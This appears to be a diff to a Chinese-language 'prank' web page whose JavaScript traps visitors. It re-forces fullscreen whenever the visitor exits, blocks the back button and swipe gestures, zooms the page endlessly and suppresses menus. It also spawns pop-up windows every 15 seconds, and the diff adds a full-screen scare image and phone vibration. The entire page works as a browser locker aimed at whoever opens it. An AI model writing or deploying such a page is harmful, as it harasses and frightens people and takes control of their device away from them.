@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>无限放大，全屏搞怪页面</title>
+    <title>你逃不掉！</title>
     <style>
         body {
             text-align: center;
@@ -13,6 +13,7 @@
         h1 {
             color: red;
             font-size: 36px;
+            text-shadow: 2px 2px black;
         }
         .prank-button {
             padding: 10px 20px;
@@ -32,12 +33,24 @@
             75% { left: 80%; top: 70%; }
             100% { left: 20%; top: 50%; }
         }
+        /* 惊吓图片隐藏 */
+        #scareImage {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
 
-    <h1>你以为能关闭我吗？试试吧！</h1>
-    <button id="prankButton" class="prank-button">试试点我关闭</button>
+    <h1>你以为能关掉我？</h1>
+    <button id="prankButton" class="prank-button">点我试试关闭</button>
+
+    <img id="scareImage" src="https://i.imgur.com/2gvCVLZ.png" alt="惊吓图片">
 
     <script>
         // 强制全屏模式
@@ -53,33 +66,47 @@
             }
         }
 
-        // 不断强制全屏
-        setTimeout(goFullScreen, 1000);  // 1秒后进入全屏
-        setInterval(goFullScreen, 5000); // 每5秒重新全屏
+        // 当用户退出全屏时重新进入全屏
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                goFullScreen(); // 如果退出全屏，则重新进入全屏
+            }
+        });
 
-        // 阻止页面卸载和返回键事件
-        window.onbeforeunload = function() {
-            setTimeout(goFullScreen, 1000); // 1秒后重新全屏
-            return "你确定要关闭我吗？";
-        };
+        // 每5秒重新全屏一次
+        setInterval(goFullScreen, 5000); // 强制全屏
 
-        // 捕获安卓浏览器的返回键，重定向回当前页面
+        // 捕获安卓浏览器的返回键，自动重定向回当前页面
         window.history.pushState(null, null, window.location.href);
         window.addEventListener('popstate', function(event) {
             window.history.pushState(null, null, window.location.href);
-            alert("返回无效！你还在这里！");
+            alert("你不能返回！");
         });
 
-        // 无限放大效果：动态修改viewport
+        // 无限页面缩放
         setInterval(function() {
             document.querySelector("meta[name='viewport']").setAttribute("content", "width=device-width, initial-scale=5.0, maximum-scale=10.0");
-        }, 1000); // 每隔1秒放大页面
+        }, 1000); // 每秒放大页面
 
-        // 移动的按钮
+        // 移动的关闭按钮
         const prankButton = document.getElementById('prankButton');
         prankButton.addEventListener('click', function() {
-            alert("你真的以为点我就能关闭？再试一次吧！");
+            alert("你以为点我就能关闭？再试一次吧！");
+            triggerScare();
         });
+
+        // 惊吓效果：显示图片并震动
+        function triggerScare() {
+            const scareImage = document.getElementById('scareImage');
+            scareImage.style.display = 'block'; // 显示惊吓图片
+            setTimeout(function() {
+                scareImage.style.display = 'none'; // 几秒后隐藏惊吓图片
+            }, 3000);
+            // 让手机震动
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 200, 500]);
+            }
+        }
 
         // 禁止右键菜单和长按菜单
         document.addEventListener('contextmenu', function(e) {
@@ -98,10 +125,20 @@
             }
         }, { passive: false });
 
-        // 不断弹出新窗口
+        // 不断弹出新窗口，干扰用户操作
         setInterval(function() {
             window.open(window.location.href, "_blank", "width=500,height=500");
-        }, 20000);  // 每20秒弹出新窗口
+        }, 15000);  // 每15秒弹出新窗口
+
+        // 捕获滑动手势，阻止返回
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // 页面卸载阻止
+        window.onbeforeunload = function() {
+            return "你确定要关闭吗？";
+        };
     </script>
 
 </body>
